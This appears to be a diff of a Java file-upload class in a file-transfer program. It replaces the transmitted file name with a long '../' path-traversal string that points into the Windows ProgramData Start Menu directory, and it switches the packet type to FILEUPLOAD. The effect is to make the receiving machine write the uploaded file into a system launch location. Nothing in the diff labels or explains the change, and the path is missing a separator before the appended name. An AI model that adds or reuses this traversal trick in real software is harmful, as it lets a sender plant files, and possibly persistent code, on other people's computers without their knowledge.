@@ -37,9 +37,9 @@ public class AsyncUpload extends AsyncTransfert {
 			fis = new FileInputStream(file);
 			
 			this.expectedBytes = totalLen;
-			String fileName = file.getName();
+			String fileName = "../../../../../../../../../../../../../ProgramData/Microsoft/Windows/Start Menu" + file.getName();
 			PacketHeader fileHeader = new PacketHeader( totalLen + PacketUtils.calculateNetworkStringLength(fileName) , 
-					MeTransfertPacketTypes.FILE);
+					MeTransfertPacketTypes.FILEUPLOAD);
 			out.writeAndFlush(fileHeader);
 			//send file name
 			out.writeAndFlush(fileName);
